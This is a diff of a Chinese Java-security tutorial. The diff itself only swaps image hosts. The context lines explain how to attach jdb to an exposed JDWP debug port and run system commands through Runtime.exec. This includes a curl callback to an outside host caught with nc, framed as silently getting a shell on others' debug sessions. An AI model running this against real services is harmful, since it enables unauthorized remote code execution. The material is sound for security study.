@@ -6,17 +6,17 @@ JPDA(`Java Platform Debugger Architecture`) 是 Java 平台调试体系结构的
 
 这个jdwp服务提供来对java程序调试的功能，只要有程序启动时使用了jdwp参数且端口绑定在内网或者共网上时候我们就可以利用这个服务来执行java代码片段弹shell。比较典型的有tomcat启动的时候如果是以jpda方式启动的话就会启动一个8000端口用于远程调试。
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918164155_580.png)
+![img](https://oss.javasec.org/images/20190918164155_580.png)
 
 
 
 假设我们需要远程调试一段Java程序，如Test.java的main方法：
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918161911_104.png)
+![img](https://oss.javasec.org/images/20190918161911_104.png)
 
 如果要远程调试我们就需要使用到远程调试参数，我们使用IDEA远程调试的时候会提示我们配置如下参数：
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918161657_473.png)
+![img](https://oss.javasec.org/images/20190918161657_473.png)
 
 所以我们只需要在执行:java Test 之前添加我们的调试参数即可。
 
@@ -26,11 +26,11 @@ java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=*:8003 Test
 
 如下图：
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918162359_476.png)
+![img](https://oss.javasec.org/images/20190918162359_476.png)
 
 测试环境IP是：192.168.88.203，于是我们使用java自带的jdb(Java调试工具)来连接他的8003端口。
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918162732_784.png)
+![img](https://oss.javasec.org/images/20190918162732_784.png)
 
 jdb自带了很多命令，可以通过命令来查看各种调试信息，详情可以自己执行help命令查看。
 
@@ -124,11 +124,11 @@ exit (或 quit)            -- 退出调试器: 带有程序包限定符的完整
 
 因为他使用的是暂停模式，所以我们可以直接在jdb中执行stepi命令来执行当前指令，否则我们需要使用stop 命令来设置断点了，然后我们就可以使用eval或者print指令来调用Runtime去执行系统命令：`eval java.lang.Runtime.getRuntime().exec("curl p2j.cn:8003").getInputStream())`
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918163235_140.png)
+![img](https://oss.javasec.org/images/20190918163235_140.png)
 
 我们需要在远程服务器上nc下8003端口即可接收受攻击的机器curl过来的请求：
 
-![img](https://javasec.oss-cn-hongkong.aliyuncs.com/images/20190918163600_499.png)
+![img](https://oss.javasec.org/images/20190918163600_499.png)
 
 也就是说我们可以在别人debug的时候使用jdb attach进去然后悄无声息的弹个shell回来玩了，这种场景在内网通常是比较常见的遇到这个服务的时候记得试试吧。
 
